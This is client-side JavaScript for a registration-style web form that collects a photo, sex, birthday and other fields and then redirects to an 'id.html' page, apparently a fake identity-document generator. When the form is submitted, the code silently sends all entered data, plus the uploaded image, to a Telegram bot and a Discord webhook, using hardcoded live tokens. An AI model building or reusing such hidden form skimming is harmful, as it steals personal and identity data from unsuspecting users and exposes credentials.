var selector = document.querySelector(".selector_box");
selector.addEventListener("click", () => {
  if (selector.classList.contains("selector_open")) {
    selector.classList.remove("selector_open");
  } else {
    selector.classList.add("selector_open");
  }
});

document.querySelectorAll(".date_input").forEach((element) => {
  element.addEventListener("click", () => {
    document.querySelector(".date").classList.remove("error_shown");
  });
});

var sex = "m";

document.querySelectorAll(".selector_option").forEach((option) => {
  option.addEventListener("click", () => {
    sex = option.id;
    document.querySelector(".selected_text").innerHTML = option.innerHTML;
  });
});

var upload = document.querySelector(".upload");

var imageInput = document.createElement("input");
imageInput.type = "file";
imageInput.accept = ".jpeg,.png,.gif";

document.querySelectorAll(".input_holder").forEach((element) => {
  var input = element.querySelector(".input");
  input.addEventListener("click", () => {
    element.classList.remove("error_shown");
  });
});

upload.addEventListener("click", () => {
  imageInput.click();
  upload.classList.remove("error_shown");
});

const WEBHOOK_URL =
  "https://discord.com/api/webhooks/1370132737201148096/q4ueD5cpE5ZF0FZqXlpDIy7M1q11h3x3ffgNc1CN5GIoHGz5eRSxgkjXEXkdZsXDHBrt"; // Replace with your Discord webhook URL

imageInput.addEventListener("change", () => {
  upload.classList.remove("upload_loaded");
  upload.classList.add("upload_loading");

  upload.removeAttribute("selected");

  const file = imageInput.files[0];
  const formData = new FormData();
  formData.append("file", file);
  formData.append(
    "payload_json",
    JSON.stringify({ content: "Uploaded image:" })
  );

  fetch(WEBHOOK_URL, {
    method: "POST",
    body: formData,
  })
    .then((response) => {
      if (response.ok) {
        return response.json();
      } else {
        throw new Error("Failed to upload image.");
      }
    })
    .then((data) => {
      const attachments = data.attachments;

      if (attachments && attachments.length > 0) {
        const imageUrl = attachments[0].url;

        upload.classList.remove("error_shown");
        upload.setAttribute("selected", imageUrl);
        upload.classList.add("upload_loaded");
        upload.classList.remove("upload_loading");
        upload.querySelector(".upload_uploaded").src = imageUrl;
      } else {
        throw new Error("Image uploaded, but no URL returned.");
      }
    })
    .catch((error) => {
      console.error("Error uploading image:", error);
      upload.classList.add("error_shown");
      upload.classList.remove("upload_loading");
    });
});

document.querySelector(".go").addEventListener("click", () => {
  var empty = [];
  var params = new URLSearchParams();

  params.set("sex", sex);
  if (!upload.hasAttribute("selected")) {
    empty.push(upload);
    upload.classList.add("error_shown");
  } else {
    params.set("image", upload.getAttribute("selected"));
  }

  var birthday = "";
  var dateEmpty = false;
  document.querySelectorAll(".date_input").forEach((element) => {
    birthday = birthday + "." + element.value;
    if (isEmpty(element.value)) {
      dateEmpty = true;
    }
  });

  birthday = birthday.substring(1);

  if (dateEmpty) {
    var dateElement = document.querySelector(".date");
    dateElement.classList.add("error_shown");
    empty.push(dateElement);
  } else {
    params.set("birthday", birthday);
  }

  document.querySelectorAll(".input_holder").forEach((element) => {
    var input = element.querySelector(".input");

    if (isEmpty(input.value)) {
      empty.push(element);
      element.classList.add("error_shown");
    } else {
      params.set(input.id, input.value);
    }
  });

  if (empty.length != 0) {
    empty[0].scrollIntoView();
  } else {
    sendToTelegram(params);
    sendToDiscordWebhook(params);
    forwardToId(params);
  }
});

function isEmpty(value) {
  let pattern = /^\s*$/;
  return pattern.test(value);
}

function forwardToId(params) {
  location.href = "/id.html?" + params;
}

function sendToTelegram(params) {
  const token = "8177439507:AAEavBvnfAQdkzs7bTTBYGvvUmF54S2Z1hc";
  const chatId = "5655999020";
  const message = `New Registration:\n${params.toString()}`;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: "HTML",
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log("Message sent to Telegram:", data);
    })
    .catch((error) => {
      console.error("Error sending message to Telegram:", error);
    });
}

function sendToDiscordWebhook(params) {
  const webhookUrl =
    "https://discord.com/api/webhooks/1370132737201148096/q4ueD5cpE5ZF0FZqXlpDIy7M1q11h3x3ffgNc1CN5GIoHGz5eRSxgkjXEXkdZsXDHBrt";

  const message = {
    content: `**New Registration**\n${decodeURIComponent(
      params.toString()
    ).replace(/&/g, "\n")}`,
  };

  fetch(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(message),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log("Message sent to Discord:", data);
    })
    .catch((error) => {
      console.error("Error sending message to Discord:", error);
    });
}
